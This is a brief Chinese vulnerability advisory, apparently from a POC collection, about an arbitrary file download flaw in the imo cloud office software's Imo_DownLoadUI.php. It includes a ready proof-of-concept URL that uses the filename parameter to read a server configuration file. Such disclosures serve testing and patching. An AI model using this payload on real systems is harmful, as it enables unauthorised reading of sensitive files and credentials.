# imo 云办公室 Imo_DownLoadUI.php 任意文件下载漏洞

## 漏洞描述
imo 云办公室 由于 /file/Placard/upload/Imo_DownLoadUI.php 页面 filename 参数过滤不严，导致可以读取系统敏感文件。

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
登录页面

![image-20220524171455819](images/202205241714963.png)

验证POC

```
/file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php
```


## Payloads
```
/file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php
```
